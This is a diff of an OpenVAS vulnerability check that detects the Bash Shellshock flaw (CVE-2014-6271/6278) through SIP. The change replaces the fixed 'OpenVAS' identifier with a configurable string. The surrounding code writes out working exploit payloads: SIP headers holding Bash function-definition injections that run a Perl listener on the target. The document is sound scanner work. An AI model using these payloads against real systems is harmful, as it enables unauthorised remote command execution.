@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_sip_remote_cmd_exec_vuln.nasl 10317 2018-06-25 14:09:46Z cfischer $
+# $Id: gb_bash_shellshock_sip_remote_cmd_exec_vuln.nasl 10974 2018-08-15 09:55:34Z cfischer $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (SIP Check)
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105093");
-  script_version("$Revision: 10317 $");
-  script_cve_id("CVE-2014-6271","CVE-2014-6278");
+  script_version("$Revision: 10974 $");
+  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-06-25 16:09:46 +0200 (Mon, 25 Jun 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-15 11:55:34 +0200 (Wed, 15 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-09-29 11:47:16 +0530 (Mon, 29 Sep 2014)");
   script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability(SIP Check)");
   script_category(ACT_ATTACK);
@@ -90,8 +90,11 @@ host = get_host_name();
 soc = open_sip_socket( port:port, proto:proto );
 if( ! soc ) exit( 0 );
 
+from_default = get_vt_string();
+from_lower   = get_vt_string( lowercase:TRUE );
+
 nc_port = rand() % 64512 + 1024;
-rand = 'OpenVAS-' + rand_str( length:28 );
+rand = from_default + "-" + rand_str( length:28 );
 
 perl = 'perl -MIO::Socket -e \'my $l = new IO::Socket::INET(LocalPort => "' + nc_port  +
        '", Proto =>"tcp", Listen => 1, Reuse => 1) or die;  local $SIG{ALRM} =' +
@@ -112,7 +115,7 @@ sip = 'v=0\r\n' +
 
 req = 'INVITE sip:0987654321@' + host + ' SIP/2.0\r\n' +
       'Via: SIP/2.0/' + toupper( proto ) + ' ' + this_host() + ':' + port + ';branch=z9hG4bK724588683\r\n' +
-      'From: "OpenVAS" <sip:0123456789@' + this_host() + '>;tag=784218059\r\n' +
+      'From: "' + from_default + '" <sip:0123456789@' + this_host() + '>;tag=784218059\r\n' +
       'To: <sip:0987654321@' + host + ':' + port + '>\r\n' +
       'Call-ID: ' + rand() + '\r\n' +
       'CSeq: 1 INVITE\r\n' +
@@ -120,8 +123,8 @@ req = 'INVITE sip:0987654321@' + host + ' SIP/2.0\r\n' +
       'Content-Type: application/sdp\r\n' +
       'Allow: INVITE, INFO, PRACK, ACK, BYE, CANCEL, OPTIONS, NOTIFY, REGISTER, SUBSCRIBE, REFER, PUBLISH, UPDATE, MESSAGE\r\n' +
       'Max-Forwards: 70\r\n' +
-      'User-Agent: OpenVAS-' + OPENVAS_VERSION + '\r\n' +
-      'X-Ploit: () { OpenVAS:; }; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '\r\n' +
+      'User-Agent: ' + from_default + '-' + OPENVAS_VERSION + '\r\n' +
+      'X-Ploit: () { ' + from_default + ':; }; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '\r\n' +
       'X-Ploit1: () { _; } >_[$($())] { PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '; }\r\n' +
       'Supported: replaces\r\n' +
       'Expires: 360\r\n' +
